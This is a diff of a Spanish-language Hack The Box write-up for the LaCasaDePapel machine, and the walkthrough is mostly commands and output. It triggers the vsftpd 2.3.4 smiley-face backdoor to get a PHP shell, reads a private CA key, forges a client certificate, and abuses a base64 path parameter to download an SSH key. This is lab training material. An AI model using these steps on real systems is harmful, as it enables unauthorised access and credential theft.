@@ -1,8 +1,28 @@
+---
+layout: single
+title: La Casa de Papel - Hack The Box
+excerpt: "Tocamos certificados ssl"
+date: 2024-12-01
+classes: wide
+header:
+  teaser: /assets/images/htb-valentine/valentine1.png
+categories:
+  - hackthebox
+  - writeup
+tags:
+  - hackthebox
+  - openssl
+  - LFI
+  - weak permissions 
+---
+
 # 10.10.10.131 - LaCasaDePapel
+![](/assets/images/htb-casapapel/la_casa_de_papel0.png)
 
 --------------------------
 # Reconocimiento inicial
 
+Primero lanzamos Nmap
 ```bash
 $: nmap -sCV 10.10.10.131 -p 21,22,80,443
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 14:41 CET
@@ -10,7 +30,7 @@ Nmap scan report for 10.10.10.131
 Host is up (0.035s latency).
 
 PORT    STATE SERVICE  VERSION
-21/tcp  open  ftp      vsftpd 2.3.4
+21/tcp  open  ftp      
 22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
 80/tcp  open  http     Node.js (Express middleware)
 |_http-title: La Casa De Papel
@@ -25,7 +45,11 @@ PORT    STATE SERVICE  VERSION
 | tls-nextprotoneg:
 |   http/1.1
 |_  http/1.0
+```
 
+Vemos tanto `ssh`, `ftp`, `http` y `https`. A pesar de ver una versión vulnerable muy conocida (`vsftpd 2.3.4`), Primero hacemos cierto 
+reconocimiento sobre las webs. 
+```bash
 $: whatweb http://10.10.10.131:80
 http://10.10.10.131:80 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.131], Title[La Casa De Papel], X-Powered-By[Express]
 
@@ -35,29 +59,34 @@ https://10.10.10.131:443 [401 Unauthorized] Country[RESERVED][ZZ], HTML5, IP[10.
 $: curl -sv https://10.10.10.131:443 -k
 * Server certificate:
 *  subject: CN=lacasadepapel.htb; O=La Casa De Papel
-...
+(...)
 < HTTP/1.1 401 Unauthorized
 < X-Powered-By: Express
-...
+(...)
 <!DOCTYPE html><html lang="en"><head><title>La Casa De Papel</title><style type="text/css">body {
-...
+(...)
 ```
+- En la web de http encontramos un códigoQr que parece un rabbit hole, porque probando cosas no he dado con nada interesante. 
+![](/assets/images/htb-casapapel/la_casa_de_papel3.png)
+- En https nos salta un error de que falta un certificado
+![](/assets/images/htb-casapapel/la_casa_de_papel2.png)
 
 Haciendo fuzzing con wfuzz no encontramos ninguna ruta interesante
-
 ```bash
 $: wfuzz --hc=404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb" http://lacasadepapel.htb/
-
+(...)
 $: wfuzz --hc=404 --hh=1754 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb" http://lacasadepapel.htb/
-
+(...)
 $: wfuzz --hc=404,401 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb"https://lacasadepapel.htb:443
+(...)
 ```
 
 --------------------------
 # PHP Shell
 
-Si nos vamos al puerto ftp, sabemos que esa versión en concreto es vulnerable a una backdoor en el puerto 6200 si mandas el usaurio con una carita `:)`
-
+Volvemos con `vsftpd 2.3.4` en el puerto 21, procedemos a explotarla manualmente. 
+1. Mandamos una carita sonriente en el nombre `USER cucusxii:)`  
+2. Escuchamos por el puerto 6200  
 ```bash
 $: nc -nv 10.10.10.131 21
 (UNKNOWN) [10.10.10.131] 21 (ftp) open
@@ -69,7 +98,10 @@ PASS :)
 $: nc -nv 10.10.10.131 6200
 (UNKNOWN) [10.10.10.131] 6200 (?) open
 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+```
 
+Tenemos una extraña shell de PHP, donde podemos mandar comandos
+```php
 ls
 Variables: $tokyo
 
@@ -89,7 +121,10 @@ show $tokyo
     8| 	}
     9| }
 ```
-Podemos correr ciertos comandos de php
+
+En este código estan mostrando que crean un certificado x509 con el archivo `/home/nairobi/ca.key`
+Podemos correr ciertos comandos propios de php (al igual que hacer `php --interactive`), pero no es tal cosa ya que por ejemplo no necesitamos
+`print_r` para comandos como `scandir`
 ```php
 echo 3 + 3;
 6⏎
@@ -100,15 +135,13 @@ PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 
 phpinfo()
 PHP Version => 7.2.10
 disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
-```
 
-Por ejemplo listar directorios, en una consola interactiva de php utilizamos `print_r` para comandos como `scandir` pero aquí no, ya que se trata de
-algún script personalizado.
-
-```php
 print_r(scandir("/home");
 PHP Parse error: Syntax error, unexpected ';', expecting ')' on line 1
+```
 
+Seguimos probando cosas, por ejemplo mirar `/home/nairobi/ca.key`
+```php
 scandir("/home");
 => [ ".", "..", "berlin", "dali", "nairobi", "oslo", "professor", ]
 
@@ -122,9 +155,10 @@ file_get_contents("/home/nairobi/ca.key");
    -----END PRIVATE KEY-----\n
    """
 ```
-Nos copiamos esa `ca.key` para utilizarla mas adelante. 
+--------------------------
+# Certificado ssl
 
-Tambien podemos ver que hay ciertos archivos
+Nos copiamos esa `ca.key` para utilizarla mas adelante. Tambien podemos ver que hay ciertos archivos
 ```bash
 scandir("/home/berlin/downloads");
 => [ ".", "..", "SEASON-1", "SEASON-2", "Select a season", ]
@@ -155,15 +189,21 @@ Verifying - Enter Export Password:
 ```
 
 Si importamos tanto la `ca.key` como el certificado `hackthebox.pkcs12`, podemos acceder a la web del puerto 443.
+![](/assets/images/htb-casapapel/la_casa_de_papel4.png)
+![](/assets/images/htb-casapapel/la_casa_de_papel5.png)
+![](/assets/images/htb-casapapel/la_casa_de_papel6.png)
 
-Esta nos muestra una serie de archivos, los capitulos de las dos temporadas en video (vacíos obviamnete, pero la máquina parece imitar entonces un
-porta pirata). 
+Esta nos muestra una serie de archivos, los capitulos de las dos temporadas en video (vacíos obviamnete, pero la máquina parece imitar 
+entonces un portal pirata). 
+![](/assets/images/htb-casapapel/la_casa_de_papel7.png)
 
 - Tenemos el parámetro `?path=SEASON-1`, que lista directorios, sabemos que la ruta completa es `/home/berlin/downloads/SEASON-1`, tambien que este usuario tiene una llave privada a la que no podíamos acceder. Pero el parametro es para directorios solo, no archivos, 
+![](/assets/images/htb-casapapel/la_casa_de_papel8.png)
 
 Si ponemos `../.ssh` salen los archivos, pero no podemos descargarlos
-
+![](/assets/images/htb-casapapel/la_casa_de_papel9.png)
 - Al descargar los archivos de video, vemos que hace una petición `GET` a `/file` mas una cadena de caracteres que parece base64, en efecto, así es
+![](/assets/images/htb-casapapel/la_casa_de_papel10.png)
 ```bash
 $: echo "U0VBU09OLTEvMDIuYXZp" | base64 -d
 SEASON-1/02.avi
@@ -181,6 +221,9 @@ $: ssh -i id_rsa berlin@10.10.10.131
 berlin@10.10.10.131's password:
 ```
 
+--------------------------
+# Escalada de privilegios
+
 Pero tenemos mas usuarios, se intenta uno a uno hasta que
 ```bash
 $: ssh -i id_rsa professor@10.10.10.131
@@ -196,7 +239,7 @@ lacasadepapel [~]$ echo $SHELL
 /bin/ash
 ```
 
-Si subo mi script de reconocimiento: 
+Si subo [mi script de reconocimiento](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/lin_info.sh) y lo ejecuto:
 ```bash
   >  Carpetas home de los diferentes usuarios
 berlin >
